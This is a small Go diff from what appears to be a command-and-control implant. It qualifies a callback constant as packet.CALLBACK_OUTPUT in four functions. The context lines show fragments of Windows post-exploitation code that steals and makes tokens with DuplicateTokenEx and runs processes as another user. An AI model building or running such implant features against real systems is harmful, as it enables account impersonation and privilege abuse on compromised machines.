@@ -115,7 +115,7 @@ func GetPrivsByte(b []byte) error {
 	if err != nil {
 		return err
 	}
-	packet.PushResult(CALLBACK_OUTPUT, []byte(result))
+	packet.PushResult(packet.CALLBACK_OUTPUT, []byte(result))
 	return nil
 }
 
@@ -155,7 +155,7 @@ func StealToken(b []byte) error {
 		return errors.New(fmt.Sprintf("DuplicateTokenEx error: %s", err))
 	}
 	isTokenValid = true
-	packet.PushResult(CALLBACK_OUTPUT, []byte("Steal token success"))
+	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("Steal token success"))
 	return nil
 }
 
@@ -188,7 +188,7 @@ func MakeToken(b []byte) error {
 		return errors.New(fmt.Sprintf("DuplicateTokenEx error: %s", err))
 	}
 	isTokenValid = true
-	packet.PushResult(CALLBACK_OUTPUT, []byte("Make token success"))
+	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("Make token success"))
 	return nil
 }
 
@@ -257,6 +257,6 @@ func RunAs(b []byte) error {
 	_ = windows.ReadFile(hRPipe, buf, &bytesRead, &read)
 
 	result := buf[:read.InternalHigh]
-	packet.PushResult(CALLBACK_OUTPUT, result)
+	packet.PushResult(packet.CALLBACK_OUTPUT, result)
 	return nil
 }
